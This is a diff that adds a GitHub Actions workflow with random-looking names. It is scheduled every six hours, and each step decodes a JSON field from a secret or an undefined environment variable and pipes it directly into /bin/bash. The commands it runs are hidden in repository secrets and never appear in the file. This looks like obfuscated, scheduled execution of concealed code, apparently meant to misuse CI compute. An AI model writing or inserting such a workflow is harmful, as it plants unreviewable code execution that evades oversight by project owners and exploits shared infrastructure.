@@ -1,0 +1,24 @@
+name: luyinsi6734
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: luyinsi6734
+        env:
+          njf7: ${{ secrets.njf7 }}
+        run: |
+          echo $njf7 | jq -r .hyqst6 | /bin/bash
+          echo $hive3827 | jq -r .aosjj311 | /bin/bash
+          echo $brhj21 | jq -r .xjafh9 | /bin/bash
+          echo $r57 | jq -r .hmhfg729 | /bin/bash
+          echo $wk80112 | jq -r .c6124 | /bin/bash
+          echo $us14930 | jq -r .fauvf870 | /bin/bash
+          echo $rcdib72 | jq -r .bhca77 | /bin/bash
+
